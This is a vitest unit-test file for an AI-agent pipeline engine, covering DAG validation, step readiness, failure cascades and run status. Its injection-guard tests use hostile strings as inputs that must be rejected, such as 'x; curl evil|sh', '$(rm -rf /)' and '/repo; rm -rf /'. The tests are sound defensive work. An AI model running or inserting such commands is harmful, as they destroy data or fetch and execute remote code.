/**
 * Pipeline engine — exhaustive unit tests of the PURE core. No I/O: every case
 * builds a spec/run and asserts the validation result or state transition.
 * Locks DAG validation (ids, deps, cycles), readiness, parallel fan-out/fan-in,
 * failure cascade-skip, and run-status derivation.
 */
import { describe, it, expect } from "vitest";
import {
  validateSpec,
  parsePipelineSpec,
  initRun,
  readySteps,
  applyStepStarted,
  applyStepOutcome,
  applyStepFailedToStart,
  deriveRunStatus,
  isRunComplete,
  isTerminalStep,
  isSafeModel,
  hasShellMetachars,
} from "@/lib/pipeline/engine";
import type { PipelineSpec, PipelineStep } from "@/lib/pipeline/types";

const NOW = Date.parse("2026-06-15T12:00:00Z");

function step(over: Partial<PipelineStep> & { id: string }): PipelineStep {
  return {
    agent: "claude",
    task: `do ${over.id}`,
    ...over,
  };
}

function spec(
  steps: PipelineStep[],
  over: Partial<PipelineSpec> = {}
): PipelineSpec {
  return {
    name: "test-pipeline",
    workingDirectory: "/repo",
    steps,
    ...over,
  };
}

/** Drive a step from pending → running → outcome in one helper. */
function runStep(
  run: ReturnType<typeof initRun>,
  id: string,
  outcome: "succeeded" | "failed",
  now = NOW
) {
  run = applyStepStarted(run, id, `sess-${id}`, now);
  run = applyStepOutcome(run, id, outcome, now);
  return run;
}

describe("parsePipelineSpec — the custom-spec editor's parse+validate", () => {
  it("returns the spec for valid JSON that passes validation", () => {
    const text = JSON.stringify(spec([step({ id: "a" })]));
    const r = parsePipelineSpec(text);
    expect(r.errors).toEqual([]);
    expect(r.spec?.steps.map((s) => s.id)).toEqual(["a"]);
  });

  it("reports a JSON syntax error (no spec)", () => {
    const r = parsePipelineSpec("{ not json");
    expect(r.spec).toBeNull();
    expect(r.errors).toHaveLength(1);
    expect(r.errors[0].message).toMatch(/Invalid JSON/);
  });

  it("surfaces validation errors for well-formed JSON that's an invalid spec", () => {
    // Valid JSON, but missing name + a cyclic dependency → no spec, real errors.
    const bad = JSON.stringify({
      workingDirectory: "/repo",
      steps: [
        { id: "a", agent: "claude", task: "x", dependsOn: ["b"] },
        { id: "b", agent: "claude", task: "y", dependsOn: ["a"] },
      ],
    });
    const r = parsePipelineSpec(bad);
    expect(r.spec).toBeNull();
    expect(r.errors.length).toBeGreaterThan(0);
    expect(r.errors.some((e) => /name is required/i.test(e.message))).toBe(
      true
    );
  });
});

describe("validateSpec", () => {
  it("accepts a minimal valid single-step pipeline", () => {
    const r = validateSpec(spec([step({ id: "a" })]));
    expect(r.valid).toBe(true);
    expect(r.errors).toEqual([]);
  });

  it("accepts a valid diamond DAG", () => {
    const r = validateSpec(
      spec([
        step({ id: "draft" }),
        step({ id: "impl-1", dependsOn: ["draft"] }),
        step({ id: "impl-2", dependsOn: ["draft"] }),
        step({ id: "merge", dependsOn: ["impl-1", "impl-2"] }),
      ])
    );
    expect(r.valid).toBe(true);
  });

  it("requires a pipeline name and workingDirectory", () => {
    const r = validateSpec(
      spec([step({ id: "a" })], { name: "", workingDirectory: "" })
    );
    expect(r.valid).toBe(false);
    expect(r.errors.map((e) => e.message)).toEqual(
      expect.arrayContaining([
        "pipeline name is required",
        "pipeline workingDirectory is required",
      ])
    );
  });

  it("requires at least one step", () => {
    const r = validateSpec(spec([]));
    expect(r.valid).toBe(false);
    expect(r.errors[0].message).toMatch(/at least one step/);
  });

  it("flags an empty step id", () => {
    const r = validateSpec(spec([step({ id: "" })]));
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /non-empty id/.test(e.message))).toBe(true);
  });

  it("flags duplicate step ids", () => {
    const r = validateSpec(spec([step({ id: "a" }), step({ id: "a" })]));
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /duplicate step id: a/.test(e.message))).toBe(
      true
    );
  });

  it("flags an empty task", () => {
    const r = validateSpec(spec([step({ id: "a", task: "  " })]));
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /non-empty task/.test(e.message))).toBe(true);
  });

  it("flags an invalid agent", () => {
    const r = validateSpec(
      spec([
        step({ id: "a", agent: "gpt5" as unknown as PipelineStep["agent"] }),
      ])
    );
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /invalid agent/.test(e.message))).toBe(true);
  });

  it("rejects 'shell' as a step agent (not spawnable)", () => {
    const r = validateSpec(
      spec([step({ id: "a", agent: "shell" as PipelineStep["agent"] })])
    );
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /invalid agent/.test(e.message))).toBe(true);
  });

  it("accepts codex and hermes agents", () => {
    const r = validateSpec(
      spec([
        step({ id: "a", agent: "codex" }),
        step({ id: "b", agent: "hermes" }),
      ])
    );
    expect(r.valid).toBe(true);
  });

  it("accepts the worktreePolicy enum (new / shared) and exitCriteria", () => {
    const r = validateSpec(
      spec([
        step({ id: "a", worktreePolicy: "new", exitCriteria: "tests pass" }),
        step({ id: "b", worktreePolicy: "shared" }),
      ])
    );
    expect(r.valid).toBe(true);
  });

  it("rejects an invalid worktreePolicy", () => {
    const r = validateSpec(
      spec([
        step({
          id: "a",
          worktreePolicy: "bogus" as unknown as PipelineStep["worktreePolicy"],
        }),
      ])
    );
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /invalid worktreePolicy/.test(e.message))).toBe(
      true
    );
  });

  it("flags a dependency on an unknown step", () => {
    const r = validateSpec(spec([step({ id: "a", dependsOn: ["ghost"] })]));
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /unknown step "ghost"/.test(e.message))).toBe(
      true
    );
  });

  it("flags a self-dependency", () => {
    const r = validateSpec(spec([step({ id: "a", dependsOn: ["a"] })]));
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /depends on itself/.test(e.message))).toBe(
      true
    );
  });

  it("detects a direct cycle (a -> b -> a)", () => {
    const r = validateSpec(
      spec([
        step({ id: "a", dependsOn: ["b"] }),
        step({ id: "b", dependsOn: ["a"] }),
      ])
    );
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /cycle detected/.test(e.message))).toBe(true);
  });

  it("detects a longer cycle (a -> b -> c -> a)", () => {
    const r = validateSpec(
      spec([
        step({ id: "a", dependsOn: ["c"] }),
        step({ id: "b", dependsOn: ["a"] }),
        step({ id: "c", dependsOn: ["b"] }),
      ])
    );
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /cycle detected/.test(e.message))).toBe(true);
  });

  it("does NOT flag a diamond as a cycle (shared dep is fine)", () => {
    const r = validateSpec(
      spec([
        step({ id: "a" }),
        step({ id: "b", dependsOn: ["a"] }),
        step({ id: "c", dependsOn: ["a"] }),
        step({ id: "d", dependsOn: ["b", "c"] }),
      ])
    );
    expect(r.valid).toBe(true);
  });

  it("collects multiple errors in one pass", () => {
    const r = validateSpec(
      spec([step({ id: "a", task: "", dependsOn: ["ghost"] })], { name: "" })
    );
    expect(r.errors.length).toBeGreaterThanOrEqual(3);
  });

  it("rejects a model with shell metacharacters (injection guard)", () => {
    const r = validateSpec(spec([step({ id: "a", model: "x; curl evil|sh" })]));
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /invalid model/.test(e.message))).toBe(true);
  });

  it("rejects a model with command substitution", () => {
    const r = validateSpec(spec([step({ id: "a", model: "$(rm -rf /)" })]));
    expect(r.valid).toBe(false);
    expect(r.errors.some((e) => /invalid model/.test(e.message))).toBe(true);
  });

  it("accepts a provider-qualified model id", () => {
    const r = validateSpec(
      spec([
        step({
          id: "a",
          agent: "hermes",
          model: "anthropic/claude-sonnet-4.6",
        }),
      ])
    );
    expect(r.valid).toBe(true);
  });

  it("rejects a step workingDirectory with shell metacharacters", () => {
    const r = validateSpec(
      spec([step({ id: "a", workingDirectory: "/repo; rm -rf /" })])
    );
    expect(r.valid).toBe(false);
    expect(
      r.errors.some((e) => /workingDirectory contains illegal/.test(e.message))
    ).toBe(true);
  });

  it("accepts a plain Windows-style and POSIX workingDirectory", () => {
    expect(
      validateSpec(
        spec([step({ id: "a" })], { workingDirectory: "C:\\repo\\proj" })
      ).valid
    ).toBe(true);
    expect(
      validateSpec(
        spec([step({ id: "a" })], { workingDirectory: "~/code/proj" })
      ).valid
    ).toBe(true);
  });

  it("rejects a pipeline-level workingDirectory with metacharacters", () => {
    const r = validateSpec(
      spec([step({ id: "a" })], { workingDirectory: "/repo && evil" })
    );
    expect(r.valid).toBe(false);
  });
});

describe("isSafeModel / hasShellMetachars", () => {
  it("isSafeModel accepts normal model ids and rejects injection", () => {
    expect(isSafeModel("sonnet")).toBe(true);
    expect(isSafeModel("claude-opus-4-8")).toBe(true);
    expect(isSafeModel("anthropic/claude-sonnet-4.6")).toBe(true);
    expect(isSafeModel("gpt-4o:latest")).toBe(true);
    expect(isSafeModel("x; rm -rf /")).toBe(false);
    expect(isSafeModel("$(evil)")).toBe(false);
    expect(isSafeModel("a`b`")).toBe(false);
    expect(isSafeModel("")).toBe(false);
  });

  it("hasShellMetachars flags command injection but not path chars", () => {
    expect(hasShellMetachars("/repo/proj")).toBe(false);
    expect(hasShellMetachars("C:\\Users\\me\\proj")).toBe(false);
    expect(hasShellMetachars("~/code")).toBe(false);
    expect(hasShellMetachars("a; b")).toBe(true);
    expect(hasShellMetachars("a | b")).toBe(true);
    expect(hasShellMetachars("a $(b)")).toBe(true);
    expect(hasShellMetachars('a "b"')).toBe(true);
  });
});

describe("applyStepFailedToStart", () => {
  it("fails a pending step without a session id and cascades skip", () => {
    let run = initRun(
      spec([step({ id: "a" }), step({ id: "b", dependsOn: ["a"] })]),
      { id: "r", now: NOW }
    );
    run = applyStepFailedToStart(run, "a", NOW, "spawn failed");
    expect(run.steps.a.status).toBe("failed");
    expect(run.steps.a.sessionId).toBeNull(); // no fake id leaks
    expect(run.steps.a.detail).toBe("spawn failed");
    expect(run.steps.b.status).toBe("skipped");
    expect(run.status).toBe("failed");
  });

  it("is a no-op for a non-pending step", () => {
    let run = initRun(spec([step({ id: "a" })]), { id: "r", now: NOW });
    run = applyStepStarted(run, "a", "sess-a", NOW);
    const same = applyStepFailedToStart(run, "a", NOW, "x");
    expect(same).toBe(run);
  });
});

describe("initRun", () => {
  it("creates all steps pending and the run pending", () => {
    const run = initRun(spec([step({ id: "a" }), step({ id: "b" })]), {
      id: "run1",
      now: NOW,
    });
    expect(run.id).toBe("run1");
    expect(run.status).toBe("pending");
    expect(run.createdAt).toBe(NOW);
    expect(run.endedAt).toBeNull();
    expect(Object.keys(run.steps)).toEqual(["a", "b"]);
    expect(run.steps.a.status).toBe("pending");
    expect(run.steps.a.sessionId).toBeNull();
  });
});

describe("readySteps", () => {
  it("returns root steps (no deps) initially", () => {
    const run = initRun(
      spec([step({ id: "a" }), step({ id: "b", dependsOn: ["a"] })]),
      { id: "r", now: NOW }
    );
    expect(readySteps(run).map((s) => s.id)).toEqual(["a"]);
  });

  it("returns ALL independent roots for parallel launch", () => {
    const run = initRun(
      spec([step({ id: "a" }), step({ id: "b" }), step({ id: "c" })]),
      {
        id: "r",
        now: NOW,
      }
    );
    expect(
      readySteps(run)
        .map((s) => s.id)
        .sort()
    ).toEqual(["a", "b", "c"]);
  });

  it("does not return a step whose dep hasn't succeeded yet", () => {
    let run = initRun(
      spec([step({ id: "a" }), step({ id: "b", dependsOn: ["a"] })]),
      { id: "r", now: NOW }
    );
    run = applyStepStarted(run, "a", "sess-a", NOW); // a running, not done
    expect(readySteps(run).map((s) => s.id)).toEqual([]);
  });

  it("releases a dependent once its dep succeeds (fan-out)", () => {
    let run = initRun(
      spec([
        step({ id: "draft" }),
        step({ id: "impl-1", dependsOn: ["draft"] }),
        step({ id: "impl-2", dependsOn: ["draft"] }),
      ]),
      { id: "r", now: NOW }
    );
    run = runStep(run, "draft", "succeeded");
    expect(
      readySteps(run)
        .map((s) => s.id)
        .sort()
    ).toEqual(["impl-1", "impl-2"]);
  });

  it("only releases a fan-in step when ALL deps succeed", () => {
    let run = initRun(
      spec([
        step({ id: "a" }),
        step({ id: "b" }),
        step({ id: "merge", dependsOn: ["a", "b"] }),
      ]),
      { id: "r", now: NOW }
    );
    run = runStep(run, "a", "succeeded");
    // a done, but b is an independent root still runnable; merge stays gated.
    expect(readySteps(run).map((s) => s.id)).toEqual(["b"]);
    run = runStep(run, "b", "succeeded");
    expect(readySteps(run).map((s) => s.id)).toEqual(["merge"]);
  });
});

describe("applyStepStarted", () => {
  it("marks a pending step running and sets the run running", () => {
    let run = initRun(spec([step({ id: "a" })]), { id: "r", now: NOW });
    run = applyStepStarted(run, "a", "sess-a", NOW + 10);
    expect(run.steps.a.status).toBe("running");
    expect(run.steps.a.sessionId).toBe("sess-a");
    expect(run.steps.a.startedAt).toBe(NOW + 10);
    expect(run.status).toBe("running");
  });

  it("is a no-op for a non-pending step", () => {
    let run = initRun(spec([step({ id: "a" })]), { id: "r", now: NOW });
    run = applyStepStarted(run, "a", "sess-a", NOW);
    const again = applyStepStarted(run, "a", "other", NOW);
    expect(again).toBe(run); // unchanged reference
  });
});

describe("applyStepOutcome", () => {
  it("marks a running step succeeded and stamps endedAt", () => {
    let run = initRun(spec([step({ id: "a" })]), { id: "r", now: NOW });
    run = applyStepStarted(run, "a", "sess-a", NOW);
    run = applyStepOutcome(run, "a", "succeeded", NOW + 100);
    expect(run.steps.a.status).toBe("succeeded");
    expect(run.steps.a.endedAt).toBe(NOW + 100);
    expect(run.status).toBe("succeeded");
    expect(run.endedAt).toBe(NOW + 100);
  });

  it("is a no-op for a step that isn't running", () => {
    const run = initRun(spec([step({ id: "a" })]), { id: "r", now: NOW });
    const same = applyStepOutcome(run, "a", "succeeded", NOW);
    expect(same).toBe(run);
  });

  it("cascades skip to a direct dependent on failure", () => {
    let run = initRun(
      spec([step({ id: "a" }), step({ id: "b", dependsOn: ["a"] })]),
      { id: "r", now: NOW }
    );
    run = runStep(run, "a", "failed");
    expect(run.steps.a.status).toBe("failed");
    expect(run.steps.b.status).toBe("skipped");
    expect(run.steps.b.detail).toMatch(/dependency did not succeed/);
    expect(run.status).toBe("failed");
  });

  it("cascades skip transitively down a chain (a fail -> b,c skipped)", () => {
    let run = initRun(
      spec([
        step({ id: "a" }),
        step({ id: "b", dependsOn: ["a"] }),
        step({ id: "c", dependsOn: ["b"] }),
      ]),
      { id: "r", now: NOW }
    );
    run = runStep(run, "a", "failed");
    expect(run.steps.b.status).toBe("skipped");
    expect(run.steps.c.status).toBe("skipped");
  });

  it("does not skip a parallel sibling that has its own satisfied deps", () => {
    let run = initRun(
      spec([
        step({ id: "a" }),
        step({ id: "b" }),
        step({ id: "after-b", dependsOn: ["b"] }),
      ]),
      { id: "r", now: NOW }
    );
    run = runStep(run, "a", "failed");
    // b is independent of a — must remain runnable.
    expect(run.steps.b.status).toBe("pending");
    expect(readySteps(run).map((s) => s.id)).toContain("b");
  });

  it("yields a 'partial' run when some succeed and some fail", () => {
    let run = initRun(
      spec([
        step({ id: "a" }),
        step({ id: "b" }),
        step({ id: "after-a", dependsOn: ["a"] }),
      ]),
      { id: "r", now: NOW }
    );
    run = runStep(run, "a", "succeeded");
    run = runStep(run, "after-a", "succeeded");
    run = runStep(run, "b", "failed");
    expect(run.status).toBe("partial");
    expect(isRunComplete(run)).toBe(true);
  });
});

describe("deriveRunStatus", () => {
  const st = (status: string, startedAt: number | null = null) => ({
    id: "x",
    status: status as never,
    sessionId: null,
    startedAt,
    endedAt: null,
    detail: null,
  });

  it("pending when nothing started", () => {
    expect(deriveRunStatus({ a: st("pending"), b: st("pending") })).toBe(
      "pending"
    );
  });
  it("running when a step is in flight", () => {
    expect(deriveRunStatus({ a: st("running", NOW), b: st("pending") })).toBe(
      "running"
    );
  });
  it("succeeded when all succeeded", () => {
    expect(deriveRunStatus({ a: st("succeeded"), b: st("succeeded") })).toBe(
      "succeeded"
    );
  });
  it("failed when all terminal and none succeeded", () => {
    expect(deriveRunStatus({ a: st("failed"), b: st("skipped") })).toBe(
      "failed"
    );
  });
  it("partial when terminal mix includes a success", () => {
    expect(deriveRunStatus({ a: st("succeeded"), b: st("failed") })).toBe(
      "partial"
    );
  });
  it("empty -> pending", () => {
    expect(deriveRunStatus({})).toBe("pending");
  });
});

describe("isTerminalStep", () => {
  it("classifies terminal vs non-terminal", () => {
    expect(isTerminalStep("succeeded")).toBe(true);
    expect(isTerminalStep("failed")).toBe(true);
    expect(isTerminalStep("skipped")).toBe(true);
    expect(isTerminalStep("pending")).toBe(false);
    expect(isTerminalStep("running")).toBe(false);
  });
});
